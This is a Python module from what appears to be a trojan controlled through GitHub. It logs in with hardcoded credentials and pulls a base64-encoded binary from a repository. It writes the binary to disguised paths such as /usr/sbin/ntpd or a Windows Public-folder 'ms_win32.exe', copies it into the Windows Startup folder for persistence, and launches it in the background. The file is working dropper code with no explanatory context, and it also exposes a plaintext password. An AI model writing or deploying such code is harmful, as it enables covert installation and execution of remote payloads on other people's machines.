from github3 import login
import json
import base64
import os

#folder = filePath.rstrip("test")

encodedFiles  = False
sourceFile = "bin/at-spi2-regd.exe" #"modules/dirlister.py" #
targetFile = "/usr/sbin/mswin.exe"
bin = True
start = True
scriptExec= "bash "
winRunOnBoot=True
linRunOnBoot=False

def connect_to_github():
	gh = login(username="MarvenGarsalli",password="1'mfor1am")
	repo = gh.repository("MarvenGarsalli","tro")
	branch = repo.branch("master")
	return gh,repo,branch

def get_file_contents(filepath):
        try:
                gh,repo,branch = connect_to_github()
                tree = branch.commit.commit.tree.to_tree().recurse()
                for filename in tree.tree:
                        if filepath in filename.path:
                                print("[OK] Found file %s" % filepath)
                                blob = repo.blob(filename._json_data['sha']) #Hashed content
                                if encodedFiles:
                                        return base64.b64decode(blob.content)
                                return blob.content
        except:
                print("exception raised!")
        return None

def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
	global sourceFile, targetFile
	print("[*] In getFileFromGit module.") #Todelete
	if os.name == 'posix':
		sourceFile = "bin/test_svr" #"modules/dirlister.py" #
		targetFile = "/usr/sbin/ntpd"

	elif os.name == 'nt': #TODO: CHeck win TargetPth
		sourceFile = "bin/test" #"modules/dirlister.py" #
		targetFile = os.getenv("PUBLIC")+"\ms_win32.exe"  #C:\Users\Public

	else:
		return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)

	script= get_file_contents(sourceFile)
	if script is not None:
		content	= base64.b64decode(script)
		if bin:
			try:
				fich = open(targetFile, "wb")
				fich.write(content)
				fich.close()
				if os.name == 'nt' and winRunOnBoot == True:
					startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
					os.system("copy /Y \"%s\" \"%s\""%(targetFile, startPath))
			except PermissionError:
				return ("[ERROR] getFileFromGit: Permission Denied!")

			if start and os.name == 'nt':
				#targetFile=targetFile.replace('\\','\\')
				os.system("start /b {}".format(targetFile))   #format(targetFile.replace('/','\\')))
			elif start and os.name == 'posix':
			    os.system("chmod 777 {}".format(targetFile))
			    os.system("./{} >/dev/null &".format(targetFile))

		else:
			fich = open(targetFile, "w")
			fich.write(content.decode())
			fich.close()
			if start:
				os.system(scriptExec+" "+targetFile)
		return str("getRunScript: file {} successfully started".format(sourceFile))
	else:
		#TODO: Customize log file path
		#os.system("echo 'getRunScript: Unable to find file {}' >> Tapalog.log".format(sourceFile))
		return str("getRunScript: Unable to find script {}".format(sourceFile))

#run()
